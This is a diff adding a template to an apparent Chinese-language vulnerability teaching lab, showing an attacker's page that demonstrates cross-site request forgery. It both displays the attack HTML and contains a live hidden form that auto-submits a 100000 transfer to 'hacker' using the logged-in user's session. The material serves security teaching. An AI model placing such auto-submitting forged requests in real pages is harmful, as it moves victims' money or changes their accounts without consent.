@@ -1,0 +1,25 @@
+{% extends "base.html" %}
+{% block title %}攻击者恶意页面 · 漏洞教学靶场{% endblock %}
+{% block content %}
+<h1>🕸️ 攻击者的恶意页面</h1>
+<p class="lead">这是一个被攻击者控制的网站。页面里藏着一个会自动提交的转账表单，利用你（alice）已登录的会话发起转账。</p>
+
+<div class="card">
+  <h2>页面源码（攻击者构造的 HTML）</h2>
+  <pre><code>&lt;form action="/csrf/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="to" value="hacker"&gt;
+  &lt;input type="hidden" name="amount" value="100000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
+  <p class="warn">注意：这个表单<strong>没有携带 CSRF token</strong>，因此修复前服务器不会拒绝它。</p>
+</div>
+
+<!-- 实际执行攻击的隐藏表单：无 CSRF token -->
+<form id="evil" action="{{ url_for('csrf_transfer') }}" method="POST">
+  <input type="hidden" name="to" value="hacker">
+  <input type="hidden" name="amount" value="100000">
+</form>
+<script>document.getElementById('evil').submit();</script>
+
+<p>⏳ 正在自动提交转账请求……</p>
+{% endblock %}
